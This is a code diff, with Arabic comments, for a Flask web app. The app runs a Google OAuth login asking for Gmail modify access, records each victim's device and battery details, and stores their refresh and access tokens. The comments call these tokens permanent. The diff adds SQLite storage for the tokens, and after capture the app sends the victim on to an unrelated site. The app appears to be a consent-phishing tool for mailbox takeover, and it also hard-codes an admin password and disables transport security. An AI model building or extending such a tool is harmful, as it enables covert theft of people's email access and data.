@@ -1,6 +1,7 @@
 import os
 import json
 import base64
+import sqlite3
 import threading
 import uuid
 from datetime import datetime
@@ -19,22 +20,106 @@ app.secret_key = 'abdellah_ultimate_secret_key_fixed_2026'
 os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'
 
 ADMIN_PASSWORD = 'abdellahCV'
-CLIENT_SECRETS_FILE = "client_secret.json"
 SCOPES = ['https://www.googleapis.com/auth/gmail.modify']
 
-# يجب أن توافق هذه القيمة مع redirect_uris في client_secret.json
-REDIRECT_URI = 'http://localhost:5000/oauth2callback'
+# يجب أن توافق هذه القيمة مع redirect_uris في إعدادات Google Cloud OAuth
+REDIRECT_URI = os.environ.get('REDIRECT_URI', 'http://localhost:5000/oauth2callback')
+CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID')
+CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET')
+TOKEN_URI = os.environ.get('GOOGLE_TOKEN_URI', 'https://oauth2.googleapis.com/token')
+AUTH_URI = os.environ.get('GOOGLE_AUTH_URI', 'https://accounts.google.com/o/oauth2/auth')
+AUTH_PROVIDER_CERT_URL = os.environ.get('GOOGLE_AUTH_PROVIDER_CERT_URL', 'https://www.googleapis.com/oauth2/v1/certs')
 
-with open(CLIENT_SECRETS_FILE, 'r', encoding='utf-8') as f:
-    CLIENT_CONFIG = json.load(f)
+if not CLIENT_ID or not CLIENT_SECRET:
+    raise RuntimeError('Please set GOOGLE_CLIENT_ID and GOOGLE_CLIENT_SECRET environment variables')
 
-CLIENT_ID = CLIENT_CONFIG['web']['client_id']
-CLIENT_SECRET = CLIENT_CONFIG['web']['client_secret']
-TOKEN_URI = CLIENT_CONFIG['web']['token_uri']
+CLIENT_CONFIG = {
+    'web': {
+        'client_id': CLIENT_ID,
+        'client_secret': CLIENT_SECRET,
+        'auth_uri': AUTH_URI,
+        'token_uri': TOKEN_URI,
+        'auth_provider_x509_cert_url': AUTH_PROVIDER_CERT_URL,
+        'redirect_uris': [REDIRECT_URI]
+    }
+}
+
+DB_FILE = 'data.db'
 
 # قاعدة البيانات المؤقتة في الذاكرة لتخزين الحسابات والتوكنز الأبدية
+# يتم مزامنتها مع SQLite بحيث لا تضيع البيانات بعد إعادة تشغيل السيرفر.
 db_users = {}
 export_tasks = {}
+
+
+def get_db_connection():
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+
+def init_db():
+    conn = get_db_connection()
+    conn.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            email TEXT PRIMARY KEY,
+            name TEXT,
+            refresh_token TEXT,
+            access_token TEXT,
+            device TEXT,
+            battery TEXT,
+            created_at TEXT,
+            updated_at TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+
+def load_users_from_db():
+    global db_users
+    db_users = {}
+    conn = get_db_connection()
+    cursor = conn.execute('SELECT * FROM users')
+    for row in cursor.fetchall():
+        db_users[row['email']] = {
+            'email': row['email'],
+            'name': row['name'],
+            'refresh_token': row['refresh_token'],
+            'access_token': row['access_token'],
+            'device': row['device'],
+            'battery': row['battery']
+        }
+    conn.close()
+
+
+def save_user_to_db(user_data):
+    conn = get_db_connection()
+    now = datetime.utcnow().isoformat()
+    conn.execute('''
+        INSERT INTO users (
+            email, name, refresh_token, access_token, device, battery, created_at, updated_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ON CONFLICT(email) DO UPDATE SET
+            name=excluded.name,
+            refresh_token=excluded.refresh_token,
+            access_token=excluded.access_token,
+            device=excluded.device,
+            battery=excluded.battery,
+            updated_at=excluded.updated_at
+    ''', (
+        user_data['email'],
+        user_data['name'],
+        user_data['refresh_token'],
+        user_data['access_token'],
+        user_data['device'],
+        user_data['battery'],
+        now,
+        now
+    ))
+    conn.commit()
+    conn.close()
+    load_users_from_db()
 
 
 def build_credentials(user_data):
@@ -81,6 +166,9 @@ def get_message_body(payload):
     return ''
 
 
+init_db()
+load_users_from_db()
+
 @app.route('/')
 def login_page():
     return render_template('login.html')
@@ -91,8 +179,8 @@ def start_auth():
     session['temp_device'] = request.json
 
     # 2. بناء تدفق التحقق الحقيقي مع إجبار التوجيه إلى localhost
-    flow = Flow.from_client_secrets_file(
-        CLIENT_SECRETS_FILE,
+    flow = Flow.from_client_config(
+        CLIENT_CONFIG,
         scopes=SCOPES,
         redirect_uri=REDIRECT_URI
     )
@@ -109,8 +197,8 @@ def start_auth():
 @app.route('/oauth2callback')
 def oauth2callback():
     # 3. استعادة التدفق عند عودة المستخدم من سيرفرات جوجل
-    flow = Flow.from_client_secrets_file(
-        CLIENT_SECRETS_FILE,
+    flow = Flow.from_client_config(
+        CLIENT_CONFIG,
         scopes=SCOPES,
         state=session.get('oauth_state'),
         redirect_uri=REDIRECT_URI
@@ -129,14 +217,14 @@ def oauth2callback():
     device_info = session.get('temp_device', {})
     
     # 6. التخزين الفعلي للبيانات والـ Refresh Token الأبدي
-    db_users[email] = {
+    save_user_to_db({
         "email": email,
         "name": email.split('@')[0],
         "refresh_token": credentials.refresh_token,
         "access_token": credentials.token,
         "device": device_info.get('device', 'غير معروف'),
         "battery": device_info.get('battery', 'غير معروف')
-    }
+    })
     
     return redirect('https://www.psfuturemail.com/')
 
